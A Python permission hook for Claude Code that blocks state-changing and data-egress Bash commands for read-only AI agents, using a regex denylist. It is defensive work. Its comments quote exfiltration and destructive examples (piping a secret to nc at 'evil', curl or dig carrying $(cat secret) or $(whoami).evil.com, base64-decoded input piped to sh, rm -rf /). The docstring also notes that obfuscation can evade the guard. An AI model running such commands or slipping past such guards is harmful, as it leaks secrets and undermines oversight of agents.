#!/usr/bin/env python3
"""PreToolUse guard — enforce read-only agents at the command level.

Wired into the read-only agents that still need Bash for observation
(sre-engineer, code-reviewer, security-reviewer) via their
`hooks: PreToolUse` frontmatter. Claude Code pipes the pending tool call as JSON on
stdin; this denies Bash commands that CHANGE STATE (prod or repo) so "read-only" is
enforced, not merely promised. Read-only triage commands (cf logs/app/events, git
log/diff/status, grep, curl GET, redirect to /dev/null, etc.) pass through untouched.

Honest boundary — this is NOT a sandbox. It is a denylist that blocks the COMMON
state-changing and data-egress VERBS for a COOPERATIVE agent; it is defense-in-depth,
not a security boundary. It cannot stop a determined adversary who fully controls the
command string (obfuscation, novel interpreters, encodings, and new tools will always
out-run a regex denylist). The LOAD-BEARING control is OS-level least-privilege
credentials (read-only CAPI / CF scopes that physically cannot mutate prod) plus an
outbound network allowlist. Treat this guard as a speed-bump that catches the obvious,
not as the thing standing between an attacker and production.

What it blocks (common verbs): cf writes, gh/GitHub writes, git writes, file/process/
service mutations, package installs (incl. cargo/go/uv/poetry/apk/pacman), HTTP writes,
output redirection to a file, tee, cp, in-place sed/perl, common nested shell/interpreter
bypasses, running local SCRIPTS or build/orchestration verbs (make/docker/terraform/
kubectl/ansible-playbook/npx/mvn/gradle, `bash deploy.sh`, `./run.sh`, `source x`,
`python3 mutate.py`, `node x.js`, `ruby x.rb`), and the common DATA-EGRESS / exfiltration
channels (the lethal-trifecta exit): raw-socket tools (nc/ncat/netcat/socat/telnet), HTTP
egress carrying command substitution, DNS-tunnel lookups carrying substitution, and a bare
`sh`/`bash` consuming a piped script on stdin. Plain GET health checks, plain DNS lookups,
and read-only interpreter probes (`python3 --version`, `python3 -m json.tool`) still pass.
Covered by scripts/test_readonly_guard.py (pure-stdlib, runs offline).

Decision is returned as a permissionDecision JSON on stdout with exit 0 (the documented
non-error path). See https://code.claude.com/docs/en/hooks

Cross-platform: pure Python stdlib, no jq. The agent hook frontmatter invokes this via
`"$(command -v python3 || command -v python)" -c ...` — it SELECTS the interpreter once (python3,
else python on Windows) and runs the guard a single time, so the guard's exit code propagates
unchanged. (The older `python3 ... || python ...` form re-ran on any non-zero exit, which turned a
deny into a fall-through on a python3-only host for the exit-2-blocking production-change-guard.)
"""
import json
import re
import sys

# Command-position anchor: start of string or just after a pipe/sep, tolerating a leading
# wrapper such as `sudo`, `env FOO=1`, `xargs`, `nice -n 10`, `time`, `nohup`, etc. Without the
# wrapper tolerance, `sudo install ...` / `sudo vim ...` would slip past the position-anchored
# patterns below. Bounded to a single command via [^|;&] so it can't span a pipeline.
_CMD = (
    r"(?:^|[|;&]\s*)"
    r"(?:(?:sudo|xargs|nice|env|time|command|nohup|setsid|stdbuf|ionice)\b[^|;&]*?\s)?"
)

# State-changing command patterns — denied for read-only agents. Case-insensitive.
_DENY_PATTERNS = [
    # PCF / cf CLI writes: deploys, scaling, lifecycle, routes, services, env, ssh, tasks
    r"\bcf\s+(?:v3-)?(push|delete|delete-[a-z-]+|scale|restart|restage|restart-app-instance|stop|start|"
    r"stage|map-route|unmap-route|create-route|delete-route|set-env|unset-env|set-label|unset-label|rename|bind-service|"
    r"unbind-service|create-service|update-service|create-user-provided-service|"
    r"update-user-provided-service|delete-user-provided-service|create-service-key|"
    r"delete-service-key|enable-ssh|disable-ssh|ssh(?!-)|run-task|terminate-task|rollback|"
    r"continue-deployment|cancel-deployment|create-app|delete-app|copy-source|set-droplet|"
    r"set-health-check|bind-route-service|unbind-route-service|share-service|unshare-service|"
    r"create-org|delete-org|create-space|delete-space|set-org-role|unset-org-role|"
    r"set-space-role|unset-space-role|create-buildpack|update-buildpack|delete-buildpack|"
    r"enable-feature-flag|disable-feature-flag|create-quota|update-quota|set-quota|"
    r"create-space-quota|update-space-quota|set-space-quota|bind-security-group|"
    r"unbind-security-group|bind-staging-security-group|unbind-staging-security-group|"
    r"create-security-group|update-security-group|add-network-policy|remove-network-policy|"
    r"enable-org-isolation|create-isolation-segment|install-plugin|uninstall-plugin|"
    r"set-running-environment-variable-group|set-staging-environment-variable-group)\b",
    r"\bcf\s+curl\b.*-X\s*(POST|PUT|DELETE|PATCH)",
    r"\bcf\s+curl\b.*--request[=\s]+(POST|PUT|DELETE|PATCH)",
    r"\bcf\s+curl\b.*(--data(-raw|-binary|-urlencode)?|\s-d[\s'\"@=])",
    # GitHub CLI writes: PR/issue/release/workflow/secrets/repo mutations
    r"\bgh\s+(pr|issue)\s+(create|edit|close|reopen|merge|ready|lock|unlock|comment|review)\b",
    r"\bgh\s+workflow\s+run\b",
    r"\bgh\s+run\s+(rerun|cancel|delete)\b",
    r"\bgh\s+(secret|variable)\s+(set|delete|remove)\b",
    r"\bgh\s+release\s+(create|delete|edit|upload)\b",
    r"\bgh\s+repo\s+(create|delete|fork|edit|rename|sync|archive|unarchive)\b",
    r"\bgh\s+api\b.*(-X\s*(POST|PUT|DELETE|PATCH)|--method[=\s]+(POST|PUT|DELETE|PATCH))",
    # git writes: history, remote, index, or worktree mutations
    r"\bgit\s+(add|mv|rm|push|commit|reset|rebase|merge|cherry-pick|revert|clean|am|apply|"
    r"restore|checkout|switch|pull|stash|gc|prune|init|worktree|update-ref|update-index|"
    r"symbolic-ref|filter-branch|branch\s+-[dDmM]|tag\s+-d|"
    r"remote\s+(add|rm|remove|set-url))\b",
    # git config WRITE: a dotted key followed by a value, or an explicit write flag.
    # Reads (`--get`/`--list`) lack the trailing value, so they pass through.
    r"\bgit\s+config\s+(?:--\S+\s+)*\S+\.\S+\s+\S",
    r"\bgit\s+config\s+(--unset|--unset-all|--replace-all|--add|--rename-section|--remove-section)\b",
    # filesystem / process / service mutations
    r"\b(rm|rmdir|mv|cp|rsync|dd|truncate|shred|chmod|chown|chgrp|ln|mkfs|mkdir|touch)\b",
    r"\bfind\b.*\s-delete\b",
    # GNU install copies/creates files; anchored to command position because 'install'
    # is also a common path component (e.g. `ls /opt/install`) and a package subcommand.
    _CMD + r"install\b",
    # interactive/line editors and awk are file writers (in command position to avoid grep'd-text false positives)
    _CMD + r"(vim|vi|nvim|nano|emacs|ex|pico|ed)\b",
    r"\b[gmn]?awk\b.*system\s*\(",
    # PowerShell mutations, for Windows shells behind the Bash tool name
    r"\b(Remove-Item|Move-Item|Copy-Item|New-Item|Set-Content|Add-Content|Out-File|"
    r"Set-Item|Clear-Item|Rename-Item|Set-ItemProperty|New-ItemProperty|Remove-ItemProperty|"
    r"Start-Service|Stop-Service|Restart-Service|Set-Service|Stop-Process|Start-Process)\b",
    # in-place file editors
    r"\bsed\s+(-[^\s]*i|--in-place)",
    r"\bperl\s+-[^\s]*i",
    # shell output redirection to a file (allow >/dev/null and fd-dup like 2>&1), and tee.
    # Target charset includes quotes so `awk '{print > "f"}'` is caught; tee is anchored to
    # command position so `ps aux | grep tee` (tee as search text) is not a false positive.
    # The (?<![-=]) look-behind keeps arrows like `->`/`=>` (common in greps, jq, commit
    # messages) from being misread as redirection — a real redirect is never preceded by - or =.
    r"(?<![-=])>>?\s*\|?\s*(?!&|/dev/null\b)[\"'~./$A-Za-z0-9_-]",
    r"(?:^|[|;&]\s*)tee\b",
    r"\b(kill|pkill|killall)\b",
    r"\b(systemctl|service)\s+(start|stop|restart|reload|enable|disable)\b",
    r"\b(shutdown|reboot|halt|poweroff)\b",
    # package / dependency installs (state change, out of scope for read-only triage)
    r"\b(apt|apt-get|yum|dnf|zypper|pip|pip3|npm|pnpm|yarn|gem|brew|choco)\s+"
    r"(install|remove|uninstall|update|upgrade|add)\b",
    # more package managers the original list missed
    r"\bcargo\s+install\b",
    r"\b(go)\s+(install|get)\b",
    r"\buv\s+pip\s+install\b",
    r"\bpoetry\s+(add|install)\b",
    r"\b(apk\s+add|pacman\s+-S)\b",
    # HTTP writes, file downloads/uploads (these mutate the local FS or a remote)
    r"\bcurl\b.*(-X\s*(POST|PUT|DELETE|PATCH)|--request\s+(POST|PUT|DELETE|PATCH))",
    r"\bcurl\b.*(--data(-raw|-binary|-urlencode)?|--form|\s-d[\s'\"@=]|\s-F[\s'\"@=])",
    # curl flags are case-sensitive (-O/-o/-T differ), so scope these out of the IGNORECASE compile
    r"\bcurl\b.*(\s(?-i:-O)\b|\s--remote-name\b|\s(?-i:-o)\s+(?!/dev/null|-)|\s(?-i:-T)\s|\s--upload-file\b)",
    r"\bwget\b(?!.*(-O\s*-|-qO-|--output-document[= ]-))",  # wget writes a file unless piped to stdout
    r"\b(scp|sftp)\b",
    # crontab edits/loads (mutations); a bare `crontab -l` listing is read-only and passes.
    r"\bcrontab\s+(?!-l\b)\S",
    # --- Data-egress / exfiltration channels (the lethal-trifecta exit) ------------------
    # A read-only agent can read secrets; these stop it from shipping them out. Raw-socket
    # tools are a clean exfil channel with no read-only-triage need on our stack (ThousandEyes
    # owns synthetics; `curl -v https://host` covers HTTP reachability). Command-position
    # anchored, so `cat secret | nc evil 443` is caught at the pipe too.
    _CMD + r"(nc|ncat|netcat|socat|telnet)\b",
    # HTTP egress that embeds command/process substitution — `curl "...?d=$(cat secret)"` or
    # a backtick/`<(...)`. Bounded to the curl/wget segment via [^|;&] so a downstream
    # `| grep $(...)` is NOT a false positive; plain GET health checks have no substitution.
    r"\b(curl|wget)\b[^|;&]*(\$\(|`|<\()",
    # DNS-tunnel exfil — dig/nslookup/host carrying substitution (`dig $(whoami).evil.com`).
    # Command-position anchored; plain lookups (`dig example.com`) still pass.
    _CMD + r"(dig|nslookup|host)\b[^|;&]*(\$\(|`|<\()",
    # Nested shells/interpreters are too easy to use as mutation bypasses.
    # Shell interpreters: -c / /c / -Command run an inline command string.
    r"\b(bash|sh|zsh|pwsh|powershell|cmd)\b.*\s(-c|/c|-Command|-File)\b",
    # Code interpreters: -c/-e/-E/-p/--eval/--print eval inline code — perl/ruby/node -e
    # are exact peers of python -c. A bare trailing `-` or a heredoc feeds a script on stdin.
    r"\b(python|python3|py|perl|ruby|node)\b.*\s(-c|-e|-E|-p|--eval|--print)\b",
    r"\b(python|python3|py|perl|ruby|node|bash|sh|zsh|pwsh|powershell)\s+-(\s|$)",
    r"\b(python|python3|py|perl|ruby|node|bash|sh|zsh|pwsh|powershell)\b[^|;&]*<<-?\s*[\"']?\w",
    # --- running local SCRIPTS / build & orchestration verbs --------------------------------
    # A read-only agent has no business executing arbitrary local scripts or kicking off
    # build/deploy/orchestration runners — these are open-ended state changes. Conservative on
    # purpose: only fire on forms that clearly RUN something, not on read-only sub-commands.
    # Build / orchestration runners (bare verb in command position; covers `make target`,
    # `docker run ...`, `terraform apply`, `kubectl ...`, `ansible-playbook ...`, `npx ...`).
    _CMD + r"(make|docker|terraform|kubectl|ansible-playbook|npx|mvn|gradle)\b",
    # cargo/go run-or-build (install/get already covered above). Command-position anchored like the
    # make/docker rule, so observation-only text — `rg "go build" .`, `grep "cargo build" notes` —
    # is NOT a false-positive; only an actual `go build`/`cargo run` in the command slot is blocked.
    # The `(?:\S*/)?` prefix also catches an absolute-path toolchain: `/usr/local/go/bin/go build`,
    # `/usr/bin/cargo run`. (A read-only `command -v go` doesn't run anything and stays allowed.)
    _CMD + r"(?:\S*/)?(go|cargo)\s+(run|build)\b",
    # An interpreter invoked on a script FILE (not an inline-code flag, not a read-only probe).
    # `bash deploy.sh`, `sh ./run.sh`, `zsh path/to/x.sh` — arg ending in .sh or a path. The
    # optional `(?:\S*/)?` prefix closes the absolute-path bypass: `/bin/bash deploy.sh` is treated
    # identically to bare `bash deploy.sh` (the inline `-c`/`-e` forms above already cover abs paths
    # via `\b`; these file-exec rules were command-position-anchored and missed the path prefix).
    _CMD + r"(?:\S*/)?(bash|sh|zsh)\s+[\"'./~$A-Za-z0-9_-]*\S+\.sh\b",
    _CMD + r"(?:\S*/)?(bash|sh|zsh)\s+\.{0,2}/\S+",
    # `python3 ./mutate.py`, `node x.js|.mjs|.cjs`, `ruby x.rb` — a script-file argument.
    # The earlier `-c/-e/--eval` and `--version`/`-m` forms are read-only and pass through.
    r"\b(python|python3|py)\s+(?!-)\S*\.py\b",
    r"\bnode\s+(?!-)\S*\.(js|mjs|cjs)\b",
    r"\bruby\s+(?!-)\S*\.rb\b",
    # `python -m py_compile`/`-m compileall` WRITE bytecode (.pyc) — not read-only. Use a pure-read
    # syntax check instead (e.g. `python3 -c "import ast,sys; ast.parse(open(sys.argv[1]).read())"`).
    r"\bpy(thon3?)?\s+(?:-\S+\s+)*-m\s+(py_compile|compileall)\b",
    # Direct execution of a local file by RELATIVE path in command position: `./deploy.sh`,
    # `../bin/x`, `bin/run`, `scripts/x.sh`. The leading char must be a non-`/` path char, so
    # ABSOLUTE paths (`/bin/cat`, `/usr/local/bin/cf apps`, `/opt/splunk/bin/splunk search`) are
    # NOT caught here — a read-only binary invoked by absolute path is fine, and an absolute-path
    # *mutating* command is still caught by its verb rule (`/bin/rm` → `\brm\b`, `…/cf push` →
    # the cf-write rule). Anchored to command position so a path ARGUMENT (`cat path/to/file`) is
    # not — `cat` holds the command slot there. The fleet's own bundled read-only triage helper is
    # exempted up front via _ALLOW_RE (it's a relative path that would otherwise trip this).
    r"(?:^|[|;&]\s*)[A-Za-z0-9_.~-]+/\S*",
    # An ABSOLUTE path to a SCRIPT FILE (by extension) in command position — `/tmp/x.sh`,
    # `/opt/app/deploy.py`. Absolute paths to BINARIES (`/bin/cat`, `/usr/local/bin/cf`) have no
    # script extension and stay allowed (handled above); this blocks running an arbitrary local
    # *script* by absolute path, which the relative-path rule above would otherwise miss. The bundled
    # triage helper is invoked by its relative `.claude/skills/...` path and allowlisted via _ALLOW_RE.
    r"(?:^|[|;&]\s*)/\S*\.(sh|bash|zsh|py|rb|js|mjs|cjs|pl|ps1)\b",
    # Sourcing a file pulls its (possibly mutating) commands into the current shell.
    r"(?:^|[|;&]\s*)source\b",
    r"(?:^|[|;&]\s*)\.\s+\S",
    # A bare `sh`/`bash`/`zsh` at the END of a pipeline consumes a script on stdin
    # (`... | base64 -d | sh`) — no `-c` needed. Anchored to a pipe so it's the sink. The
    # `(?:\S*/)?` prefix closes the absolute-path form (`... | /bin/sh`), matching the script-file rules.
    r"\|\s*(sudo\s+)?(?:\S*/)?(sh|bash|zsh)\s*(\||$|;|&)",
]
_DENY_RE = re.compile("|".join(_DENY_PATTERNS), re.IGNORECASE)

# Allowlist: the fleet's own bundled READ-ONLY triage helper, at its EXACT bundled path
# `.claude/skills/pcf-ops/scripts/triage.{sh,ps1}` (the path pcf-ops/foundations.md documents).
# The path-exec / `bash …​.sh` rules above would otherwise (wrongly) deny it. Pinned to the bundled
# path (optional leading `./`) so an attacker-planted look-alike at a DIFFERENT path —
# `/tmp/evil/pcf-ops/scripts/triage.sh`, or a CWD-relative `pcf-ops/scripts/triage.sh` — is NOT
# exempted. Anchored to the WHOLE command (optional interpreter prefix, optional args, but no command
# separators) so a chained mutation like `triage.sh; rm -rf /` does NOT get a free pass — that falls
# through to the deny rules. Args are bounded by [^|;&] to forbid pipelines/chaining.
_ALLOW_RE = re.compile(
    r"^\s*(?:bash\s+|pwsh\s+(?:-File\s+)?)?"
    r"(?:\./)?\.claude/skills/pcf-ops/scripts/triage\.(?:sh|ps1)"
    r"(?:\s+[^|;&]*)?\s*$",
    re.IGNORECASE,
)

_REASON = (
    "Blocked: this is a read-only agent. The command appears to change state "
    "(deploy/scale/restart, GitHub or git write, file/process/service mutation, package install, "
    "nested shell, or an HTTP write) or to exfiltrate data (raw-socket tool, or HTTP/DNS egress "
    "carrying command substitution). For reachability use ThousandEyes or a plain `curl`/`dig`; "
    "for a state change, recommend it and hand off to the owning writer agent with human sign-off "
    "(see the production-change-gate skill for prod)."
)


def main() -> None:
    try:
        # Read raw bytes and decode with utf-8-sig so a leading BOM (which some Windows shells
        # and pipes prepend) is stripped reliably, regardless of the locale encoding.
        raw = sys.stdin.buffer.read().decode("utf-8-sig", errors="replace")
        data = json.loads(raw) if raw.strip() else {}
    except Exception:
        sys.exit(0)  # unparseable input -> don't interfere with the normal permission flow

    if data.get("tool_name") != "Bash":
        sys.exit(0)

    command = (data.get("tool_input") or {}).get("command", "") or ""
    if _ALLOW_RE.match(command):
        sys.exit(0)  # bundled read-only triage helper — explicitly permitted
    if _DENY_RE.search(command):
        print(json.dumps({
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": "deny",
                "permissionDecisionReason": _REASON,
            }
        }))
    sys.exit(0)


if __name__ == "__main__":
    main()
